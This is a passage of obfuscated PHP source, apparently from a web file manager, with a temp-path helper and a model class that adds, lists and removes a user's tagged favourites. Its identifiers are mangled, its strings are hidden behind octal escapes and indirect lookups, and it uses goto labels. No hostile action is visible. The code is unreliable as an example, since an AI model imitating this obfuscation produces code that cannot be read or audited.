"\173\x69\157\x3a{$—§Æ’¯ƒ[$ı–‰ò[777]]}\175\57\144\141\164\141\142\x61\x73\145\57\142\141\143\153\165\160\57" . $Óø±ÚŸ• . $ı–‰ò[11] . $õÍ³ƒà; } private function tmpFilesPath() { $—¤ƒŞÍå =& $_SERVER[¹ş¤¶ĞÖ]; $Â“Ğî‡ = TEMP_FILES; if ($GLOBALS[$—¤ƒŞÍå[6]][$—¤ƒŞÍå[89]][$—¤ƒŞÍå[822]]) { $Â“Ğî‡ = $GLOBALS[$—¤ƒŞÍå[6]][$—¤ƒŞÍå[89]][$—¤ƒŞÍå[822]]; if (!mk_dir($Â“Ğî‡) || !is_writable($Â“Ğî‡) || !IO::mkfile($Â“Ğî‡ . $—¤ƒŞÍå[823])) { $Â“Ğî‡ = TEMP_FILES; } } return $Â“Ğî‡; } } goto aÆÜ†‡â ¯; fˆªÓÎ˜¼É: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($Ï­Å…Ë) { $¡ö±¾Ó˜ =& $_SERVER[¹ş¤¶ĞÖ]; return array($¡ö±¾Ó˜[1977] => array($¡ö±¾Ó˜[2362] . USER_ID, $¡ö±¾Ó˜[1978])); } protected function listData() { $äºŸ¨¶ =& $_SERVER[¹ş¤¶ĞÖ]; $†ã´ã®¼ = array($äºŸ¨¶[1667] => USER_ID, $äºŸ¨¶[512] => array($äºŸ¨¶[1981], 0)); $ƒ ô¢¦Å = $äºŸ¨¶[2363]; $Æäûş¥¯ = $this->field($ƒ ô¢¦Å)->where($†ã´ã®¼)->order($äºŸ¨¶[1984])->select(); return $Æäûş¥¯ ? $Æäûş¥¯ : array(); } protected function addToTag($È‚€ÑÃ, $¡›èğŸ) { $İ¹©³Ãß =& $_SERVER[¹ş¤¶ĞÖ]; if (!Model($İ¹©³Ãß[2126])->listData($¡›èğŸ)) { return !1; } if (is_numeric($È‚€ÑÃ)) { $å•ï‰¬  = Model($İ¹©³Ãß[851])->pathInfo($È‚€ÑÃ); if (!$å•ï‰¬ ) { return !1; } } else { $å•ï‰¬  = IO::infoSimple($È‚€ÑÃ); if (!$å•ï‰¬ ) { return !1; } $€Êæãš = $å•ï‰¬ [$İ¹©³Ãß[32]]; $ÚûÄ•‰Õ = $å•ï‰¬ [$İ¹©³Ãß[33]]; if (isset($å•ï‰¬ [$İ¹©³Ãß[439]])) { $ÚûÄ•‰Õ = $å•ï‰¬ [$İ¹©³Ãß[439]] == $İ¹©³Ãß[88] ? $İ¹©³Ãß[75] : $İ¹©³Ãß[200]; } } $¾´±…ı„ = array($İ¹©³Ãß[1667] => USER_ID, $İ¹©³Ãß[512] => $¡›èğŸ, $İ¹©³Ãß[450] => $È‚€ÑÃ, $İ¹©³Ãß[451] => $ÚûÄ•‰Õ ? $ÚûÄ•‰Õ : $İ¹©³Ãß[445], $İ¹©³Ãß[449] => $€Êæãš ? $€Êæãš : $İ¹©³Ãß[12], $İ¹©³Ãß[1870] => 0); if ($this->where($¾´±…ı„)->find()) { return !1; } return $this->add($¾´±…ı„); } protected function removeFromTag($±ÅîÛË, $…Ò„µ°ü) { $˜Áõ„¿Ï =& $_SERVER[¹ş¤¶ĞÖ]; if (!Model($˜Áõ„¿Ï[2126])->listData($…Ò„µ°ü)) { return !1; } if (is_array($±ÅîÛË)) { $±ÅîÛË = array($˜Áõ„¿Ï[7], $±ÅîÛË); } $§›³¼²• = array($˜Áõ„¿Ï[1667] => USER_ID, $˜Áõ„¿Ï[512] => $…Ò„µ°ü, $˜Áõ„¿Ï[450] => $±ÅîÛË); return $this->where($§›³¼²•)->delete(); } protected function removeByTag($¤¨Ô÷ê“) { $›òï¯ º =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¤¨Ô÷ê“) { return !1; } $›¡ÛÓ®› = array($›òï¯ º[1667] => USER_ID, $›òï¯ º[512] => $¤¨Ô÷ê“); return $this->where($›¡ÛÓ®›)->delete(); } protected function removeBySource($ÜĞÀ±û) { $•¦¯Ş¦µ =& $_SERVER[¹ş¤¶ĞÖ]; if (is_array($ÜĞÀ±û)) { $ÜĞÀ±û = array($•¦¯Ş¦µ[7], $ÜĞÀ±û); } $ÓŠ×¡íÍ = array($•¦¯Ş¦µ[1667] => USER_ID, $•¦¯Ş¦µ[512] => array($•¦¯Ş¦µ[1047], 0), $•¦¯Ş¦µ[450] => $ÜĞÀ±û); return $this->where($ÓŠ×¡íÍ)->delete(); } }